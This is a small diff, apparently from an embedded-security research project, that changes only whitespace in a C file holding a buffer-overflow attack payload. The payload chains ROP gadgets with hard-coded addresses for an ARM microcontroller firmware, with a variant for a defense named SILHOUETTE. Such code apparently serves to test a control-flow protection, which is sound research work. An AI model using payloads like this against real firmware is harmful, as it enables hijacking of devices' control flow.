@@ -18,7 +18,6 @@
 
 /* Attack payload string */
 char payload[] = "0123456789abcde\x00"	// Content for buf
-
 #ifdef SILHOUETTE
 		 /* Gadget 1 and its inputs */
 		 "\x00\x00\x00\x00"	// R7: 0
@@ -219,7 +218,7 @@ char payload[] = "0123456789abcde\x00"	// Content for buf
 		 "\xad\x68\x02\x00"	// PC: 0x000268ac <ResetISR+0xbc> (wfi; b 0x000268ac)
 #else
 		 /* Gadget 1 and its inputs */
-                 "\x00\x00\x00\x00"	// R7: 0
+		 "\x00\x00\x00\x00"	// R7: 0
 		 "\xc9\x1b\x02\x00"	// PC: 0x00021bc8 <_realloc_r+0x7e> (pop {r0,r3,r4,r6,r7,pc})
 
 		 /* Gadget 2 and its inputs */
